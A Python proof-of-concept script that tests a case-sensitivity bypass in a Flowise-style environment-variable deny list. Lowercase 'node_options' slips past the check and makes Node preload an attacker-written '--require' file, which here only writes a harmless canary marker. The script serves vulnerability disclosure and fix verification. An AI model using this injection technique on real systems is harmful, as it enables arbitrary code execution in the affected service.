import argparse
import json
import os
import pathlib
import platform
import shutil
import subprocess
import sys
import tempfile


def flowise_style_validate(env):
    dangerous = {"PATH", "LD_LIBRARY_PATH", "DYLD_LIBRARY_PATH", "NODE_OPTIONS"}
    for key, value in env.items():
        if key in dangerous:
            raise ValueError(f"Environment variable {key!r} modification is not allowed")
        if "\x00" in key or "\x00" in str(value):
            raise ValueError("Environment variables cannot contain null bytes")


def normalized_validate(env):
    dangerous = {"PATH", "LD_LIBRARY_PATH", "DYLD_LIBRARY_PATH", "NODE_OPTIONS"}
    for key, value in env.items():
        if key.upper() in dangerous:
            raise ValueError(f"Environment variable {key!r} modification is not allowed")
        if "\x00" in key or "\x00" in str(value):
            raise ValueError("Environment variables cannot contain null bytes")


def run_node_canary(marker):
    node = shutil.which("node")
    if not node:
        return {"node_found": False, "canary_created": False}
    marker_path = pathlib.Path(marker).resolve()
    loader_path = marker_path.with_suffix(".loader.js")
    loader_path.write_text(
        "require('fs').writeFileSync(process.env.FLOWISE_POC_MARKER, 'node_options honored')\n",
        encoding="utf-8",
    )
    env = os.environ.copy()
    env.pop("NODE_OPTIONS", None)
    env.pop("node_options", None)
    env["node_options"] = f"--require {loader_path}"
    env["FLOWISE_POC_MARKER"] = str(marker_path)
    if marker_path.exists():
        marker_path.unlink()
    completed = subprocess.run([node, "-e", "process.exit(0)"], env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return {
        "node_found": True,
        "node": node,
        "returncode": completed.returncode,
        "stderr": completed.stderr.strip(),
        "marker": str(marker_path),
        "canary_created": marker_path.exists(),
        "canary_content": marker_path.read_text(encoding="utf-8") if marker_path.exists() else "",
    }


def run(marker):
    exact_upper_blocked = False
    exact_upper_error = ""
    lower_variant_accepted = False
    normalized_blocks_lower = False
    try:
        flowise_style_validate({"NODE_OPTIONS": "--require blocked.js"})
    except ValueError as exc:
        exact_upper_blocked = True
        exact_upper_error = str(exc)
    try:
        flowise_style_validate({"node_options": "--require accepted.js"})
        lower_variant_accepted = True
    except ValueError:
        lower_variant_accepted = False
    try:
        normalized_validate({"node_options": "--require accepted.js"})
    except ValueError:
        normalized_blocks_lower = True
    node_result = run_node_canary(marker)
    result = {
        "platform": platform.platform(),
        "windows": os.name == "nt",
        "flowise_style_exact_upper_blocked": exact_upper_blocked,
        "flowise_style_exact_upper_error": exact_upper_error,
        "flowise_style_lower_variant_accepted": lower_variant_accepted,
        "normalized_validator_blocks_lower_variant": normalized_blocks_lower,
        "node_canary": node_result,
        "finding_reproduced": lower_variant_accepted and (node_result.get("canary_created") if os.name == "nt" else True),
    }
    print(json.dumps(result, indent=2))
    return 0 if result["finding_reproduced"] else 1


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--marker", default=str(pathlib.Path(tempfile.gettempdir()) / "flowise_node_options_case_bypass_marker.txt"))
    args = parser.parse_args()
    raise SystemExit(run(args.marker))


if __name__ == "__main__":
    main()
